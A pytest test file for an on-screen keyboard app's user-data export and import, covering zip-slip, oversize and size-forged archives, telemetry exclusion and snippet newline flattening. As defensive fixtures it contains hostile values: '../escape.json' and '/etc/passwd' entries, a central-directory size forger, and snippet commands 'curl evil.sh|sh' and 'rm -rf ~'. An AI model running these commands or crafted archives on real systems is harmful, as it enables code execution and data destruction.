"""Tests for src/data_export.py."""

from __future__ import annotations

import json
import struct
import zipfile
from pathlib import Path

import pytest

from src.data_export import (
    SCHEMA_VERSION,
    DataExportError,
    export_user_data,
    import_user_data,
    inspect_export,
    suggested_export_name,
)


def _manifest(files: list[str], pack_ids: list[str] | None = None) -> str:
    """Minimal valid manifest.json body for a hand-built archive."""
    return json.dumps(
        {
            "schema_version": SCHEMA_VERSION,
            "app_version": "1.0",
            "exported_at": "",
            "files": files,
            "pack_ids": pack_ids or [],
        }
    )


def _patch_central_directory_file_size(zip_bytes: bytes, filename: str, new_size: int) -> bytes:
    """Rewrite the declared (uncompressed) file_size in *filename*'s
    central directory record, leaving the real compressed data untouched.

    ``zipfile.ZipFile.writestr`` always derives ``file_size`` from the
    real data it is given (there is no public API to lie about it), so
    the only way to build an archive whose declared size disagrees with
    its real content is to patch the raw bytes after the fact. See the
    Central Directory File Header layout in the PKZIP APPNOTE: signature
    (4) + 18 bytes of fixed fields + compressed size (4, offset 20) +
    uncompressed size (4, offset 24) + name/extra/comment lengths (2
    each) before the variable-length name.
    """
    name_bytes = filename.encode("utf-8")
    marker = b"PK\x01\x02"
    idx = 0
    while True:
        idx = zip_bytes.find(marker, idx)
        if idx == -1:
            raise AssertionError(f"central directory record for {filename!r} not found")
        name_len = struct.unpack_from("<H", zip_bytes, idx + 28)[0]
        extra_len = struct.unpack_from("<H", zip_bytes, idx + 30)[0]
        comment_len = struct.unpack_from("<H", zip_bytes, idx + 32)[0]
        name_start = idx + 46
        if zip_bytes[name_start : name_start + name_len] == name_bytes:
            patched = bytearray(zip_bytes)
            struct.pack_into("<I", patched, idx + 24, new_size)
            return bytes(patched)
        idx += 46 + name_len + extra_len + comment_len


def _seed_config(config_dir: Path, *, with_pack: bool = True, with_telemetry: bool = True) -> None:
    """Populate a fake config dir with the files an export should pick up
    (and the one it should explicitly skip)."""
    (config_dir / "models").mkdir(parents=True, exist_ok=True)
    (config_dir / "models" / "ngram_model.json").write_text(
        json.dumps({"unigrams": {"hello": 5}, "user_vocab": {"hello": 5}})
    )
    (config_dir / "models" / "ppm_model.json").write_text(json.dumps({"context": []}))
    (config_dir / "analytics.json").write_text(json.dumps({"alltime_keystrokes": 100}))
    if with_telemetry:
        # telemetry.json must NEVER be in the archive.
        (config_dir / "telemetry.json").write_text(
            json.dumps({"anon_id": "00000000-0000-0000-0000-000000000000", "enabled": True})
        )
    if with_pack:
        pack_dir = config_dir / "packs" / "test_pack"
        pack_dir.mkdir(parents=True, exist_ok=True)
        (pack_dir / "dictionary.txt").write_text("alpha\nbeta\ngamma\n")
        (pack_dir / "bigrams.txt").write_text("alpha beta\n")
        (pack_dir / "pack.json").write_text(json.dumps({"name": "Test Pack", "version": "1.0"}))


class TestExport:
    def test_writes_zip_with_manifest(self, tmp_path: Path) -> None:
        config = tmp_path / "config"
        config.mkdir()
        _seed_config(config)
        out = tmp_path / "exp.zip"
        summary = export_user_data(config, out)
        assert out.is_file()
        assert summary.schema_version == SCHEMA_VERSION
        with zipfile.ZipFile(out) as zf:
            assert "manifest.json" in zf.namelist()
            manifest = json.loads(zf.read("manifest.json"))
        assert manifest["schema_version"] == SCHEMA_VERSION
        assert manifest["app_version"]
        assert manifest["exported_at"]

    def test_includes_model_files(self, tmp_path: Path) -> None:
        config = tmp_path / "config"
        config.mkdir()
        _seed_config(config)
        out = tmp_path / "exp.zip"
        export_user_data(config, out)
        with zipfile.ZipFile(out) as zf:
            names = set(zf.namelist())
        assert "models/ngram_model.json" in names
        assert "models/ppm_model.json" in names
        assert "analytics.json" in names

    def test_includes_packs(self, tmp_path: Path) -> None:
        config = tmp_path / "config"
        config.mkdir()
        _seed_config(config)
        out = tmp_path / "exp.zip"
        summary = export_user_data(config, out)
        assert "test_pack" in summary.pack_ids
        with zipfile.ZipFile(out) as zf:
            names = set(zf.namelist())
        assert "packs/test_pack/dictionary.txt" in names
        assert "packs/test_pack/bigrams.txt" in names
        assert "packs/test_pack/pack.json" in names

    def test_excludes_telemetry(self, tmp_path: Path) -> None:
        """The anon_id must NEVER cross machines — that's the entire
        contract of the telemetry consent doc."""
        config = tmp_path / "config"
        config.mkdir()
        _seed_config(config, with_telemetry=True)
        out = tmp_path / "exp.zip"
        export_user_data(config, out)
        with zipfile.ZipFile(out) as zf:
            for name in zf.namelist():
                assert "telemetry" not in name, f"telemetry leaked into export: {name}"

    def test_missing_config_dir_raises(self, tmp_path: Path) -> None:
        with pytest.raises(DataExportError):
            export_user_data(tmp_path / "nope", tmp_path / "exp.zip")

    def test_skips_packs_without_dictionary(self, tmp_path: Path) -> None:
        config = tmp_path / "config"
        config.mkdir()
        _seed_config(config)
        # A pack folder with no dictionary.txt should be ignored — it's
        # not a valid pack and the import-side filter would reject it.
        empty_pack = config / "packs" / "empty_pack"
        empty_pack.mkdir()
        (empty_pack / "bigrams.txt").write_text("foo bar\n")
        out = tmp_path / "exp.zip"
        summary = export_user_data(config, out)
        assert "empty_pack" not in summary.pack_ids

    def test_skips_packs_with_bad_id(self, tmp_path: Path) -> None:
        config = tmp_path / "config"
        config.mkdir()
        _seed_config(config)
        bad = config / "packs" / "../escape"
        # On POSIX this would actually create ../escape; on Windows it
        # fails. Use a regex-violating but filesystem-legal name instead.
        bad = config / "packs" / "BAD NAME"
        bad.mkdir(parents=True)
        (bad / "dictionary.txt").write_text("x\n")
        out = tmp_path / "exp.zip"
        summary = export_user_data(config, out)
        assert "BAD NAME" not in summary.pack_ids


class TestInspect:
    def test_round_trip_manifest(self, tmp_path: Path) -> None:
        config = tmp_path / "config"
        config.mkdir()
        _seed_config(config)
        out = tmp_path / "exp.zip"
        export_user_data(config, out)
        info = inspect_export(out)
        assert info.schema_version == SCHEMA_VERSION
        assert "models/ngram_model.json" in info.files
        assert "test_pack" in info.pack_ids

    def test_missing_file(self, tmp_path: Path) -> None:
        with pytest.raises(DataExportError, match="not found"):
            inspect_export(tmp_path / "nope.zip")

    def test_not_a_zip(self, tmp_path: Path) -> None:
        f = tmp_path / "junk.zip"
        f.write_bytes(b"not a zip")
        with pytest.raises(DataExportError, match="valid .zip"):
            inspect_export(f)

    def test_missing_manifest(self, tmp_path: Path) -> None:
        f = tmp_path / "no_manifest.zip"
        with zipfile.ZipFile(f, "w") as zf:
            zf.writestr("models/ngram_model.json", json.dumps({"unigrams": {}}))
        with pytest.raises(DataExportError, match="manifest.json"):
            inspect_export(f)

    def test_future_schema_rejected(self, tmp_path: Path) -> None:
        f = tmp_path / "future.zip"
        with zipfile.ZipFile(f, "w") as zf:
            zf.writestr(
                "manifest.json",
                json.dumps(
                    {
                        "schema_version": SCHEMA_VERSION + 99,
                        "app_version": "999.0.0",
                        "exported_at": "",
                        "files": [],
                        "pack_ids": [],
                    }
                ),
            )
        with pytest.raises(DataExportError, match="newer schema"):
            inspect_export(f)

    def test_zip_slip_rejected(self, tmp_path: Path) -> None:
        f = tmp_path / "evil.zip"
        with zipfile.ZipFile(f, "w") as zf:
            zf.writestr(
                "manifest.json",
                json.dumps(
                    {
                        "schema_version": SCHEMA_VERSION,
                        "app_version": "1.0",
                        "exported_at": "",
                        "files": [],
                        "pack_ids": [],
                    }
                ),
            )
            zf.writestr("../escape.json", "pwned")
        with pytest.raises(DataExportError, match=r"\.\."):
            inspect_export(f)

    def test_absolute_path_rejected(self, tmp_path: Path) -> None:
        f = tmp_path / "evil.zip"
        with zipfile.ZipFile(f, "w") as zf:
            zf.writestr(
                "manifest.json",
                json.dumps(
                    {
                        "schema_version": SCHEMA_VERSION,
                        "app_version": "1.0",
                        "exported_at": "",
                        "files": [],
                        "pack_ids": [],
                    }
                ),
            )
            zf.writestr("/etc/passwd", "pwned")
        with pytest.raises(DataExportError, match="absolute"):
            inspect_export(f)


class TestImport:
    def test_round_trip_restores_state(self, tmp_path: Path) -> None:
        """Export then import into a fresh dir produces identical files."""
        src_config = tmp_path / "src"
        src_config.mkdir()
        _seed_config(src_config)
        archive = tmp_path / "exp.zip"
        export_user_data(src_config, archive)

        dst_config = tmp_path / "dst"
        dst_config.mkdir()
        import_user_data(archive, dst_config)

        assert (dst_config / "models" / "ngram_model.json").is_file()
        original = (src_config / "models" / "ngram_model.json").read_text()
        restored = (dst_config / "models" / "ngram_model.json").read_text()
        assert original == restored
        assert (dst_config / "packs" / "test_pack" / "dictionary.txt").is_file()

    def test_import_writes_rescue_export(self, tmp_path: Path) -> None:
        """Before overwriting, the current state lands in exports/ so
        the user can revert."""
        src_config = tmp_path / "src"
        src_config.mkdir()
        _seed_config(src_config)
        archive = tmp_path / "exp.zip"
        export_user_data(src_config, archive)

        dst_config = tmp_path / "dst"
        dst_config.mkdir()
        _seed_config(dst_config, with_pack=False)  # different prior state
        # Mark dst's model so we can prove the rescue captured *its* state.
        (dst_config / "models" / "ngram_model.json").write_text(json.dumps({"sentinel": "dst"}))

        import_user_data(archive, dst_config)

        rescues = list((dst_config / "exports").glob("rescue-*.zip"))
        assert len(rescues) == 1
        with zipfile.ZipFile(rescues[0]) as zf:
            with zf.open("models/ngram_model.json") as f:
                rescued = json.load(f)
        assert rescued == {"sentinel": "dst"}

    def test_import_replaces_packs(self, tmp_path: Path) -> None:
        """Packs not in the imported archive are removed (full replace)."""
        src_config = tmp_path / "src"
        src_config.mkdir()
        _seed_config(src_config)
        archive = tmp_path / "exp.zip"
        export_user_data(src_config, archive)

        dst_config = tmp_path / "dst"
        dst_config.mkdir()
        # Seed dst with a different pack that isn't in the archive.
        stale = dst_config / "packs" / "stale_pack"
        stale.mkdir(parents=True)
        (stale / "dictionary.txt").write_text("oldword\n")

        import_user_data(archive, dst_config)

        assert (dst_config / "packs" / "test_pack" / "dictionary.txt").is_file()
        assert not stale.exists(), "stale pack should have been removed"

    def test_telemetry_not_restored(self, tmp_path: Path) -> None:
        """Even if a hand-crafted archive includes telemetry.json, the
        import's allow-list refuses to extract it."""
        f = tmp_path / "evil_but_well_formed.zip"
        with zipfile.ZipFile(f, "w") as zf:
            zf.writestr(
                "manifest.json",
                json.dumps(
                    {
                        "schema_version": SCHEMA_VERSION,
                        "app_version": "1.0",
                        "exported_at": "",
                        "files": ["telemetry.json"],
                        "pack_ids": [],
                    }
                ),
            )
            zf.writestr("telemetry.json", json.dumps({"anon_id": "leaked"}))

        dst = tmp_path / "dst"
        dst.mkdir()
        import_user_data(f, dst)
        assert not (dst / "telemetry.json").exists()

    def test_oversize_entry_rejected(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        """An entry above _MAX_FILE_BYTES is refused at the validation
        gate. Patch the cap to a tiny value so we don't have to write
        gigabytes of test data."""
        from src import data_export

        monkeypatch.setattr(data_export, "_MAX_FILE_BYTES", 8)
        f = tmp_path / "huge.zip"
        with zipfile.ZipFile(f, "w") as zf:
            zf.writestr(
                "manifest.json",
                json.dumps(
                    {
                        "schema_version": SCHEMA_VERSION,
                        "app_version": "1.0",
                        "exported_at": "",
                        "files": [],
                        "pack_ids": [],
                    }
                ),
            )
            zf.writestr("models/ngram_model.json", b"x" * 64)  # > patched cap
        with pytest.raises(DataExportError, match="per-file cap"):
            inspect_export(f)

    def test_undeclared_oversize_member_is_refused(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """entry.file_size comes from the archive's own central directory
        and need not match what decompression actually produces --
        ZipExtFile decompresses the real (larger) stream regardless of
        what the entry claims. _validate_archive_entry only ever sees the
        declared value, so a member that under-declares its size must
        still be caught during extraction, from bytes actually read."""
        from src import data_export

        monkeypatch.setattr(data_export, "_MAX_FILE_BYTES", 8)
        f = tmp_path / "lying.zip"
        real_payload = b"x" * 4096  # far more than the patched 8-byte cap
        with zipfile.ZipFile(f, "w", zipfile.ZIP_STORED) as zf:
            zf.writestr("manifest.json", _manifest(["analytics.json"]))
            zf.writestr("analytics.json", real_payload)

        patched = _patch_central_directory_file_size(f.read_bytes(), "analytics.json", 8)
        f.write_bytes(patched)

        # Confirm the patch actually took: the declared size now lies,
        # and passes the cheap pre-check (8 is not > the patched cap of 8).
        with zipfile.ZipFile(f) as zf:
            assert zf.getinfo("analytics.json").file_size == 8

        dst = tmp_path / "dst"
        dst.mkdir()
        with pytest.raises(DataExportError):
            import_user_data(f, dst)


class TestBoundedCopy:
    """Direct coverage of _bounded_copy: the per-file cap trips on bytes
    actually read, and the running total is enforced across entries, not
    just within one."""

    def test_per_file_cap_trips_on_real_bytes(self, monkeypatch: pytest.MonkeyPatch) -> None:
        import io

        from src import data_export

        monkeypatch.setattr(data_export, "_MAX_FILE_BYTES", 10)
        with pytest.raises(DataExportError, match="per-file cap"):
            data_export._bounded_copy(io.BytesIO(b"x" * 100), io.BytesIO(), "fake.txt", 0)

    def test_running_total_carries_across_entries(self, monkeypatch: pytest.MonkeyPatch) -> None:
        import io

        from src import data_export

        monkeypatch.setattr(data_export, "_MAX_FILE_BYTES", 10)
        monkeypatch.setattr(data_export, "_MAX_TOTAL_UNCOMPRESSED", 15)
        # First entry: 10 bytes, fine on its own (equal to the per-file cap).
        total = data_export._bounded_copy(io.BytesIO(b"a" * 10), io.BytesIO(), "one.txt", 0)
        assert total == 10
        # Second entry is also only 10 bytes (fine on its own too), but
        # the running total (20) now exceeds _MAX_TOTAL_UNCOMPRESSED (15).
        with pytest.raises(DataExportError, match="uncompressed size exceeds cap"):
            data_export._bounded_copy(io.BytesIO(b"b" * 10), io.BytesIO(), "two.txt", total)


class TestReservedPackNames:
    """A pack id that collides with a Windows reserved device name (con,
    nul, com1, ...) passes PACK_ID_RE (it looks like a normal lowercase
    id) but would fail dest_dir.mkdir() on Windows. It must never be
    extracted, and its presence must not abort the rest of the import."""

    def test_reserved_name_pack_is_skipped_but_import_still_succeeds(self, tmp_path: Path) -> None:
        archive = tmp_path / "reserved.zip"
        with zipfile.ZipFile(archive, "w") as zf:
            zf.writestr(
                "manifest.json",
                _manifest(
                    ["packs/con/dictionary.txt", "packs/good_pack/dictionary.txt"],
                    pack_ids=["con", "good_pack"],
                ),
            )
            zf.writestr("packs/con/dictionary.txt", "alpha\n")
            zf.writestr("packs/good_pack/dictionary.txt", "beta\n")

        dst = tmp_path / "dst"
        dst.mkdir()
        import_user_data(archive, dst)  # must not raise

        assert not (dst / "packs" / "con").exists()
        assert (dst / "packs" / "good_pack" / "dictionary.txt").is_file()

    def test_helper_matches_case_insensitively_and_with_extension(self) -> None:
        from src.prediction.pack_ids import is_reserved_device_name

        assert is_reserved_device_name("con")
        assert is_reserved_device_name("CON")
        assert is_reserved_device_name("Con.txt")
        assert is_reserved_device_name("com1")
        assert is_reserved_device_name("lpt9")
        assert not is_reserved_device_name("console")
        assert not is_reserved_device_name("company")

    def test_export_skips_a_pre_existing_reserved_name_pack(self, tmp_path: Path) -> None:
        """Only reachable on a platform that never enforced the Windows
        restriction (e.g. the folder was created on Linux), but export
        must not hand back an archive that cannot be re-imported.

        Uses "aux" rather than "nul": on some Windows builds "nul"
        redirects to the null device even as a directory path component,
        which would make the test fixture itself unwritable regardless of
        this fix.
        """
        config = tmp_path / "config"
        config.mkdir()
        pack_dir = config / "packs" / "aux"
        pack_dir.mkdir(parents=True)
        (pack_dir / "dictionary.txt").write_text("x\n")
        out = tmp_path / "exp.zip"
        summary = export_user_data(config, out)
        assert "aux" not in summary.pack_ids


class TestSnippetNewlineFlattening:
    """FIX: an imported snippet value must not be able to carry a Return
    keypress. src/snippets.py::_clean_value already strips \\r for every
    load; this covers the import-specific second half, which also
    flattens \\n (locally-authored snippets keep \\n, see
    tests/test_snippets.py::test_value_preserves_newlines)."""

    def _archive_with_snippet_value(self, path: Path, value: str) -> None:
        with zipfile.ZipFile(path, "w") as zf:
            zf.writestr("manifest.json", _manifest(["snippets.json"]))
            zf.writestr(
                "snippets.json",
                json.dumps({"version": 1, "snippets": [{"label": "Evil", "value": value}]}),
            )

    def test_embedded_newline_is_flattened_to_a_space(self, tmp_path: Path) -> None:
        archive = tmp_path / "evil.zip"
        self._archive_with_snippet_value(archive, "curl evil.sh|sh\necho done")
        dst = tmp_path / "dst"
        dst.mkdir()
        import_user_data(archive, dst)
        data = json.loads((dst / "snippets.json").read_text())
        value = data["snippets"][0]["value"]
        assert "\n" not in value
        assert value == "curl evil.sh|sh echo done"

    def test_embedded_crlf_is_flattened(self, tmp_path: Path) -> None:
        archive = tmp_path / "evil.zip"
        self._archive_with_snippet_value(archive, "line one\r\nline two")
        dst = tmp_path / "dst"
        dst.mkdir()
        import_user_data(archive, dst)
        data = json.loads((dst / "snippets.json").read_text())
        value = data["snippets"][0]["value"]
        assert "\r" not in value
        assert "\n" not in value

    def test_reload_after_import_never_sees_a_newline(self, tmp_path: Path) -> None:
        """End-to-end through the same loader the running app uses."""
        from src.snippets import SnippetStore

        archive = tmp_path / "evil.zip"
        self._archive_with_snippet_value(archive, "rm -rf ~\ndone")
        dst = tmp_path / "dst"
        dst.mkdir()
        import_user_data(archive, dst)

        store = SnippetStore(dst / "snippets.json")
        store.load()
        assert store.get_value(0) == "rm -rf ~ done"

    def test_a_failed_flatten_leaves_no_temp_file_behind(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The flatten writes through a `.flattening` temp file, and it is
        the last thing an otherwise-successful import touches, so a stray
        one is exactly what the user would be left looking at. The two
        extraction loops clean up their own `.importing` files the same
        way."""
        archive = tmp_path / "evil.zip"
        self._archive_with_snippet_value(archive, "one\ntwo")
        dst = tmp_path / "dst"
        dst.mkdir()

        real_replace = Path.replace

        def explode(self: Path, target):  # type: ignore[no-untyped-def]
            if self.name.endswith(".flattening"):
                raise OSError("simulated rename failure")
            return real_replace(self, target)

        monkeypatch.setattr(Path, "replace", explode)

        import_user_data(archive, dst)  # must not raise

        # Proves the flatten really did run and really did fail -- without
        # this the glob below would pass on a build where the step never
        # executed at all.
        data = json.loads((dst / "snippets.json").read_text())
        assert data["snippets"][0]["value"] == "one\ntwo", "the simulated failure did not fire"

        leftovers = list(dst.glob("*.flattening"))
        assert leftovers == [], f"flatten left a temp file behind: {leftovers}"

    def test_malformed_snippets_json_does_not_abort_the_rest_of_the_import(
        self, tmp_path: Path
    ) -> None:
        """The flatten step runs after snippets.json has already been
        extracted; a parse failure there must not undo an otherwise-
        successful import of the other files."""
        archive = tmp_path / "weird.zip"
        with zipfile.ZipFile(archive, "w") as zf:
            zf.writestr("manifest.json", _manifest(["models/ngram_model.json", "snippets.json"]))
            zf.writestr("models/ngram_model.json", json.dumps({"unigrams": {"hi": 1}}))
            zf.writestr("snippets.json", "not valid json {{{")
        dst = tmp_path / "dst"
        dst.mkdir()
        import_user_data(archive, dst)  # must not raise
        assert (dst / "models" / "ngram_model.json").is_file()
        # Left exactly as extracted -- the flatten step gave up cleanly.
        assert (dst / "snippets.json").read_text() == "not valid json {{{"

    def test_snippets_json_absent_from_archive_is_left_untouched(self, tmp_path: Path) -> None:
        """The flatten step must only run on a file the archive actually
        replaced; a pre-existing local snippets.json outside the import's
        scope must not be rewritten."""
        dst = tmp_path / "dst"
        dst.mkdir()
        local = dst / "snippets.json"
        local.write_text(
            json.dumps({"version": 1, "snippets": [{"label": "Home", "value": "a\nb"}]})
        )

        archive = tmp_path / "no_snippets.zip"
        with zipfile.ZipFile(archive, "w") as zf:
            zf.writestr("manifest.json", _manifest(["models/ngram_model.json"]))
            zf.writestr("models/ngram_model.json", json.dumps({"unigrams": {"hi": 1}}))
        import_user_data(archive, dst)

        assert json.loads(local.read_text())["snippets"][0]["value"] == "a\nb"


class TestSuggestedName:
    def test_format(self) -> None:
        from datetime import datetime

        name = suggested_export_name(datetime(2026, 5, 19, 14, 30, 22))
        assert name == "Alpha-OSK-Export-2026-05-19-143022.zip"
